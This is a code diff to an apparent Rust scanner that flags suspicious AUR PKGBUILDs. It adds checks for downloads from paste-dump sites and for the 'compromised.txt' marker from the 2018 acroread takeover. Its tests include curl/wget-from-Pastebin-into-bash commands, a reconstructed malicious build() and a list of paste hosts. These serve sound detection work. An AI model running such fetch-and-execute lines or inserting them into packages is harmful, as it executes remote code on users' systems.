@@ -255,6 +255,61 @@ pub(crate) fn line_of_hex_escape_payload(source: &str) -> Option<usize> {
     source.lines().position(hex_escape_payload_line).map(|i| i + 1)
 }
 
+/// A download/fetch aimed at a paste-dump site rather than a proper
+/// release/source host. Legitimate PKGBUILDs essentially never pull build
+/// inputs from a paste site; historically this is exactly how the 2018
+/// acroread/balz/minergate AUR takeover staged its payload — a `curl`
+/// straight to a Pastebin raw URL, piped into the persistence script.
+/// Distinct from the generic curl-pipe-shell check: this fires even when
+/// the fetched content isn't piped directly into a shell on the same line
+/// (e.g. saved to a file and `source`d or `exec`'d later).
+pub(crate) fn paste_site_fetch_line(line: &str) -> bool {
+    const HOSTS: &[&str] = &[
+        "pastebin.com/raw", "hastebin.com/raw", "hastebin.com/share",
+        "dpaste.com", "dpaste.org", "ix.io", "0x0.st", "transfer.sh",
+        "paste.ee", "termbin.com",
+    ];
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    if !(lower.contains("curl") || lower.contains("wget")) {
+        return false;
+    }
+    HOSTS.iter().any(|h| lower.contains(h))
+}
+
+#[cfg(test)]
+pub(crate) fn is_paste_site_fetch(source: &str) -> bool {
+    source.lines().any(paste_site_fetch_line)
+}
+
+pub(crate) fn line_of_paste_site_fetch(source: &str) -> Option<usize> {
+    source.lines().position(paste_site_fetch_line).map(|i| i + 1)
+}
+
+/// Exact filesystem artifact from the 2018 acroread/balz/minergate AUR
+/// takeover: the injected script dropped a literal `compromised.txt`
+/// marker file into `/` and every home directory. A PKGBUILD/.install
+/// hook referencing that exact filename has no legitimate reason to.
+pub(crate) fn compromised_marker_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    l.contains("compromised.txt")
+}
+
+#[cfg(test)]
+pub(crate) fn has_compromised_marker(source: &str) -> bool {
+    source.lines().any(compromised_marker_line)
+}
+
+pub(crate) fn line_of_compromised_marker(source: &str) -> Option<usize> {
+    source.lines().position(compromised_marker_line).map(|i| i + 1)
+}
+
 /// Exact indicators from known, still-circulating AUR supply-chain
 /// campaigns. Will go stale as campaigns rotate names, but it's a
 /// zero-cost, high-confidence check when it does fire.
@@ -322,12 +377,15 @@ pub(crate) fn line_of_foreign_pkg_manager_install(source: &str) -> Option<usize>
 /// How confident a finding is. `Suspicious` covers generic, crude-but-common
 /// heuristics (curl|sh, base64 -d, chmod 777, raw IP, hex-escape payload) —
 /// each a real reason to look twice but each with plausible false positives.
-/// `AtomicArch` is reserved for an exact IOC hit against a confirmed
-/// campaign, with essentially no false-positive risk, so it gets a louder alert.
+/// `ConfirmedIoc` is reserved for an exact-match indicator of compromise
+/// against a specific, disclosed AUR supply-chain campaign (e.g. Atomic
+/// Arch/June 2026, or the 2018 acroread/balz/minergate takeover), with
+/// essentially no false-positive risk, so it gets a louder alert. The
+/// specific campaign is always named in the finding's own message.
 #[derive(Clone, Copy, PartialEq, Eq, Debug)]
 pub(crate) enum Severity {
     Suspicious,
-    AtomicArch,
+    ConfirmedIoc,
 }
 
 #[derive(Clone, Debug)]
@@ -378,10 +436,24 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "contains a long run of \\xHH hex-escape sequences (possible encoded/obfuscated payload)".to_string(),
         });
     }
+    if let Some(line) = line_of_paste_site_fetch(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "fetches from a paste-dump site (pastebin/hastebin/dpaste/ix.io/...) — the delivery mechanism used by the 2018 acroread/balz/minergate AUR takeover".to_string(),
+        });
+    }
+    if let Some(line) = line_of_compromised_marker(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::ConfirmedIoc,
+            message: "references 'compromised.txt' — the exact marker file dropped by the 2018 acroread/balz/minergate AUR takeover".to_string(),
+        });
+    }
     if let Some((line, name)) = line_of_known_malicious_package(source) {
         findings.push(Finding {
             line,
-            severity: Severity::AtomicArch,
+            severity: Severity::ConfirmedIoc,
             message: format!(
                 "references '{}' — a known-malicious package name from a documented AUR supply-chain campaign (Atomic Arch, June 2026)",
                 name
@@ -437,7 +509,7 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) {
         any_findings = true;
 
         let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
-            .filter(|(_, f)| f.severity == Severity::AtomicArch)
+            .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
             .collect();
         let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
             .filter(|(_, f)| f.severity == Severity::Suspicious)
@@ -445,8 +517,9 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) {
 
         // Highest-confidence alert first: a confirmed IOC match against a
         // disclosed campaign is more actionable than a generic heuristic.
+        // The specific campaign is named in each finding's own message.
         if !atomic.is_empty() {
-            print_finding_block(pkg, "Alert, detected Atomic Arch package", &atomic, true);
+            print_finding_block(pkg, "Alert, matched a known-malicious IOC", &atomic, true);
         }
         if !suspicious.is_empty() {
             print_finding_block(pkg, "Warning, detected suspicious fragment", &suspicious, false);
@@ -480,9 +553,10 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) {
 
 /// Print one alert block in the emerge-style `>>> ===...` box.
 ///
-/// `is_atomic` picks the color scheme: `true` (confirmed Atomic Arch IOC
-/// match, near-zero false-positive risk) uses red/orange for a louder
-/// alert; `false` (generic heuristic hit) uses yellow throughout.
+/// `is_atomic` picks the color scheme: `true` (a confirmed IOC match
+/// against a disclosed campaign, near-zero false-positive risk) uses
+/// red/orange for a louder alert; `false` (generic heuristic hit) uses
+/// yellow throughout.
 ///
 /// Each finding line names the file and line it fired on; the block ends
 /// with a direct cgit link per referenced file so the user can jump straight to it.
@@ -755,7 +829,7 @@ post_install() {
 
         let install_findings = scan_pkgbuild_source(install_hook);
         assert!(install_findings.iter().any(|f| f.message.contains("atomic-lockfile")));
-        assert!(install_findings.iter().any(|f| f.severity == Severity::AtomicArch));
+        assert!(install_findings.iter().any(|f| f.severity == Severity::ConfirmedIoc));
     }
 
     #[test]
@@ -773,7 +847,7 @@ post_install() {
         let findings = scan_pkgbuild_source(src);
         // Hits both the exact-IOC check (AtomicArch) and the generic
         // foreign-package-manager heuristic (Suspicious) on the same line.
-        assert!(findings.iter().any(|f| f.severity == Severity::AtomicArch && f.line == 2));
+        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2));
         assert!(findings.iter().any(|f| f.severity == Severity::Suspicious && f.line == 2));
     }
 
@@ -788,5 +862,55 @@ build() {
 "#;
         let findings = scan_pkgbuild_source(src);
         assert_eq!(findings.len(), 3);
+    }
+
+    // ── 2018 acroread/balz/minergate takeover ───────────────────────────
+    //
+    // Real incident: a hijacked orphaned AUR package fetched a persistence
+    // script from a Pastebin raw URL and, once run, dropped a literal
+    // `compromised.txt` marker into every home directory. Covered here by
+    // two independent heuristics: the paste-site fetch (Suspicious, since
+    // the mechanism alone has some legitimate uses) and the marker
+    // filename itself (ConfirmedIoc, since there's no legitimate reason
+    // for a PKGBUILD to reference it at all).
+
+    #[test]
+    fn paste_site_fetch_detected() {
+        assert!(is_paste_site_fetch("curl -s https://pastebin.com/raw/AbCd1234 -o stage2.sh"));
+        assert!(is_paste_site_fetch("wget -qO- https://ix.io/abcd | bash"));
+        assert!(is_paste_site_fetch("curl https://0x0.st/xyz.sh"));
+        assert!(!is_paste_site_fetch("curl -sSL https://github.com/foo/bar/releases/download/v1/foo.tar.gz"));
+        assert!(!is_paste_site_fetch("# curl https://pastebin.com/raw/AbCd1234 (just a comment)"));
+        // Mentioning a paste site without an actual fetch verb shouldn't fire.
+        assert!(!is_paste_site_fetch("# see https://pastebin.com/raw/AbCd1234 for context"));
+    }
+
+    #[test]
+    fn compromised_marker_detected() {
+        assert!(has_compromised_marker("touch /compromised.txt"));
+        assert!(has_compromised_marker("echo pwned > \"$HOME/compromised.txt\""));
+        assert!(!has_compromised_marker("# compromised.txt was the 2018 marker file (comment only)"));
+        assert!(!has_compromised_marker("this file is totally fine"));
+    }
+
+    #[test]
+    fn acroread_2018_style_pkgbuild_flagged() {
+        // Reconstructed shape of the real 2018 payload: fetch a script off
+        // Pastebin and pipe it into the shell, which then drops the marker
+        // file. Should trip curl-pipe-shell (Suspicious), paste-site-fetch
+        // (Suspicious), and — since the marker also happens to appear in
+        // this build() — the exact-IOC check (ConfirmedIoc).
+        let src = r#"
+pkgname=acroread
+build() {
+  curl -sSL https://pastebin.com/raw/deadbeef | bash
+  echo pwned > /compromised.txt
+}
+"#;
+        let findings = scan_pkgbuild_source(src);
+        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc
+            && f.message.contains("compromised.txt")));
+        assert!(findings.iter().any(|f| f.message.contains("paste-dump site")));
+        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
     }
 }
